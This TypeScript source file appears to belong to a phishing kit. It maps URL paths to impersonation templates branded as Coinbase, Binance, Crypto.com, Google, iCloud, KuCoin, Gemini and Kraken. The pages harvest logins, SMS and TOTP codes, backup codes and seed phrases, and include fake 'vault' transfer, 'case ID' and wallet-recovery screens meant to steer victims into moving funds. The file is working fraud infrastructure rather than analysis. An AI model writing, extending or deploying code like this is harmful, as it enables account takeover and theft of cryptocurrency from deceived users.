/**
 * Maps domain module + URL path to visitor template brand/page labels.
 * Paths mirror src/lib/modules.ts landingPages and signinPages values.
 */
import { findTemplate, VISITOR_TEMPLATES } from '../visitorTemplates.js';

export interface VisitorTemplateRef {
	brand: string;
	page: string;
}

const COINBASE_PATHS: Record<string, VisitorTemplateRef> = {
	'/loading': { brand: 'Coinbase', page: 'Loading' },
	'/sign-in/loading': { brand: 'Coinbase', page: 'Loading' },
	'/sign-in': { brand: 'Coinbase', page: 'Review Login' },
	'/case': { brand: 'Coinbase', page: 'Case ID' },
	'/wallet/setup': { brand: 'Coinbase', page: 'Vault Setup' },
	'/dashboard': { brand: 'Coinbase', page: 'Activity' },
	'/processing': { brand: 'Coinbase', page: 'Securing Account' },
	'/signin/review-transaction': { brand: 'Coinbase', page: 'Review Withdrawal' },
	'/signin/change-password': { brand: 'Coinbase', page: 'Change Password' },
	'/signin/url': { brand: 'Coinbase', page: 'External' },
	'/signin/sms-incorrect': { brand: 'Coinbase', page: 'SMS Verify' },
	'/signin/sms': { brand: 'Coinbase', page: 'SMS Verify' },
	'/signin/sms7': { brand: 'Coinbase', page: 'SMS Verify' },
	'/signin/sms8': { brand: 'Coinbase', page: 'SMS Verify' },
	'/signin/email-code': { brand: 'Coinbase', page: 'Review Email' },
	'/signin/representative': { brand: 'Coinbase', page: 'Review Login' },
	'/signin/auth-code': { brand: 'Coinbase', page: 'SMS Verify' },
	'/signin/auth-code-incorrect': { brand: 'Coinbase', page: 'SMS Verify' },
	'/signin/incorrect-pw': { brand: 'Coinbase', page: 'Change Password' },
	'/signin/generate-wallet': { brand: 'Coinbase', page: 'Vault Setup' },
	'/signin/wallet/setup-wallet': { brand: 'Coinbase', page: 'Vault Setup' },
	'/signin/external-wallet': { brand: 'Coinbase', page: 'External' },
	'/signin/disconnect-wallet': { brand: 'Coinbase', page: 'Terminate Devices' },
	'/signin/whitelist-success': { brand: 'Coinbase', page: 'Protect Assets' },
	'/signin/unlink-wallet': { brand: 'Coinbase', page: 'Terminate Devices' },
	'/signin/whitelist-wallet': { brand: 'Coinbase', page: 'Protect Assets' },
	'/signin/wallet/trezor-unlink': { brand: 'Coinbase', page: 'Terminate Devices' },
	'/signin/wallet/ledger-unlink': { brand: 'Coinbase', page: 'Terminate Devices' },
	'/signin/wallet/trezor-unlink-success': { brand: 'Coinbase', page: 'Securing Account' },
	'/signin/wallet/ledger-unlink-success': { brand: 'Coinbase', page: 'Securing Account' },
	'/signin/wallet/sends-reversing': { brand: 'Coinbase', page: 'Securing Account' },
	'/signin/wallet/wallet-connect-unlink': { brand: 'Coinbase', page: 'Terminate Devices' },
	'/signin/ledger-recovery': { brand: 'Coinbase', page: 'CBW' },
	'/signin/metamask-recovery': { brand: 'Coinbase', page: 'CBW' },
	'/signin/pending-callback': { brand: 'Coinbase', page: 'Loading' },
	'/signin/processing': { brand: 'Coinbase', page: 'Securing Account' },
	'/signin/reschedule': { brand: 'Coinbase', page: 'Loading' },
	'/signin/unauthorized': { brand: 'Coinbase', page: 'Review Login' },
	'/signin/estimate-hold': { brand: 'Coinbase', page: 'Balance' },
	'/signin/review': { brand: 'Coinbase', page: 'Review Login' },
	'/signin/trust-device': { brand: 'Coinbase', page: 'Trust Device' },
	'/signin/terminate-devices': { brand: 'Coinbase', page: 'Terminate Devices' },
	'/vault/transfer': { brand: 'Coinbase', page: 'Transfer from Coinbase' },
	'/vault/select-asset': { brand: 'Coinbase', page: 'Select Asset' },
	'/vault/confirm': { brand: 'Coinbase', page: 'Confirm Transfer' },
	'/vault/sms': { brand: 'Coinbase', page: 'Vault SMS' },
	'/vault/verify': { brand: 'Coinbase', page: 'Verification Required' },
	'/vault/dashboard': { brand: 'Coinbase', page: 'Vault Dashboard' },
	'/vault/seed-phrase': { brand: 'Coinbase', page: 'Seed Phrase' }
};

const CDC_PATHS: Record<string, VisitorTemplateRef> = {
	'/loading': { brand: 'CDC', page: 'Loading' },
	'/dashboard': { brand: 'CDC', page: 'Activity' },
	'/case': { brand: 'CDC', page: 'Case ID' },
	'/wallet': { brand: 'CDC', page: 'Wallet' }
};

const GOOGLE_PATHS: Record<string, VisitorTemplateRef> = {
	'/loading': { brand: 'Google', page: 'Loading' },
	'/login': { brand: 'Google', page: 'Login' },
	'/password': { brand: 'Google', page: 'Password' },
	'/sms': { brand: 'Google', page: 'SMS' },
	'/totp': { brand: 'Google', page: 'TOTP' },
	'/backup': { brand: 'Google', page: 'Backup code' },
	'/fail': { brand: 'Google', page: 'Fail' }
};

const ICLOUD_PATHS: Record<string, VisitorTemplateRef> = {
	'/login': { brand: 'iCloud', page: 'Login' },
	'/password': { brand: 'iCloud', page: 'Password' },
	'/2fa': { brand: 'iCloud', page: '2fa' },
	'/locked': { brand: 'iCloud', page: 'Locked' }
};

const KUCOIN_PATHS: Record<string, VisitorTemplateRef> = {
	'/loading': { brand: 'KuCoin', page: 'Loading' }
};

export const PATH_TO_TEMPLATE: Record<string, Record<string, VisitorTemplateRef>> = {
	Coinbase: COINBASE_PATHS,
	'Coinbase Vault': {
		'/vault/setup': { brand: 'Coinbase', page: 'Vault Setup' },
		'/vault/dashboard': { brand: 'Coinbase', page: 'Vault Dashboard' },
		'/vault/processing': { brand: 'Coinbase', page: 'Securing Account' },
		'/vault/transfer': { brand: 'Coinbase', page: 'Transfer from Coinbase' },
		'/vault/select-asset': { brand: 'Coinbase', page: 'Select Asset' },
		'/vault/confirm': { brand: 'Coinbase', page: 'Confirm Transfer' },
		'/vault/sms': { brand: 'Coinbase', page: 'Vault SMS' },
		'/vault/verify': { brand: 'Coinbase', page: 'Verification Required' },
		'/vault/seed-phrase': { brand: 'Coinbase', page: 'Seed Phrase' },
		...COINBASE_PATHS
	},
	Binance: {
		'/loading': { brand: 'Binance', page: 'Loading' },
		'/signin': { brand: 'Binance', page: 'Case' },
		'/case': { brand: 'Binance', page: 'Case' },
		'/dashboard': { brand: 'Binance', page: 'Activity' },
		'/processing': { brand: 'Binance', page: 'Loading' }
	},
	CDC: CDC_PATHS,
	Google: GOOGLE_PATHS,
	iCloud: ICLOUD_PATHS,
	KuCoin: KUCOIN_PATHS,
	// Gemini has no dedicated templates — aliased to Coinbase
	Gemini: {
		'/loading': { brand: 'Coinbase', page: 'Loading' },
		'/signin': { brand: 'Coinbase', page: 'Review Login' }
	},
	// Kraken has no dedicated templates — aliased to Coinbase
	Kraken: {
		'/loading': { brand: 'Coinbase', page: 'Loading' },
		'/signin': { brand: 'Coinbase', page: 'Review Login' }
	}
};

export function resolveVisitorTemplate(
	module: string,
	path: string
): VisitorTemplateRef | undefined {
	return PATH_TO_TEMPLATE[module]?.[path] ?? resolveVisitorTemplateFromSlug(path);
}

/** Resolve `/{slug}` paths (e.g. `/coinbase/trust-device`) when not in the module map. */
export function resolveVisitorTemplateFromSlug(path: string): VisitorTemplateRef | undefined {
	const normalized =
		path.length > 1 && path.endsWith('/') ? path.slice(0, -1) : path;
	const tpl = VISITOR_TEMPLATES.find((t) => `/${t.slug}` === normalized);
	if (!tpl) return undefined;
	const brand = tpl.module === 'Coinbase Vault' ? 'Coinbase' : tpl.module;
	return { brand, page: tpl.page };
}

/** Reverse lookup: template label → shortest visitor URL path for a module. */
export function resolveTemplateToPath(module: string, brand: string, page: string): string | null {
	const modulesToSearch = module
		? [module, ...Object.keys(PATH_TO_TEMPLATE).filter((m) => m !== module)]
		: Object.keys(PATH_TO_TEMPLATE);

	for (const mod of modulesToSearch) {
		const map = PATH_TO_TEMPLATE[mod];
		if (!map) continue;

		const matches = Object.entries(map)
			.filter(([, ref]) => ref.brand === brand && ref.page === page)
			.map(([path]) => path);

		if (matches.length > 0) {
			return matches.sort((a, b) => a.length - b.length)[0];
		}
	}

	return null;
}

/** Parse `"Coinbase/Activity"` and resolve to a visitor path. */
export function templateLabelToVisitorPath(label: string, module?: string): string | null {
	const idx = label.indexOf('/');
	if (idx <= 0 || idx >= label.length - 1) return null;
	const brand = label.slice(0, idx);
	const page = label.slice(idx + 1);
	const fromMap = resolveTemplateToPath(module || brand, brand, page);
	if (fromMap) return fromMap;
	const tpl = findTemplate(brand, page);
	if (tpl) return `/${tpl.slug}`;
	return null;
}
